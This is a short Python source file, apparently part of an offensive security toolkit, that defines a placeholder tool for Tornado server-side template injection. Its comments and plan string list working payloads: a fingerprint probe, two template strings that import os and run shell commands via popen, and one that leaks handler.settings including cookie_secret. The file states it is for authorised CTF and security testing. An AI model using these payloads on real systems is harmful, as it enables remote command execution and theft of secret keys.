"""Tornado SSTI 利用 —— 占位符(逐引擎实现,本文件待实现)。

实现要点:
指纹: {{7*7}}→49。
RCE: {%import os%}{{os.popen(cmd).read()}}、{%from os import popen%}{{popen(cmd).read()}}。
信息泄露: {{handler.settings}} 常含 cookie_secret 等敏感配置。

仅用于授权 CTF / 安全测试环境。
"""
from app.core.registry import register_tool

from tools.web.ssti_base import SstiEngineTool


@register_tool
class SstiTornadoTool(SstiEngineTool):
    name = "ssti_tornado"
    description = "Tornado(Python) SSTI:模板内直接 import 模块 RCE、handler.settings 泄露(占位符)"
    engine_key = "tornado"
    engine_name = "Tornado"
    default_mode = "exec"
    plan = r"""指纹: {{7*7}}→49。
RCE: {%import os%}{{os.popen(cmd).read()}}、{%from os import popen%}{{popen(cmd).read()}}。
信息泄露: {{handler.settings}} 常含 cookie_secret 等敏感配置。"""
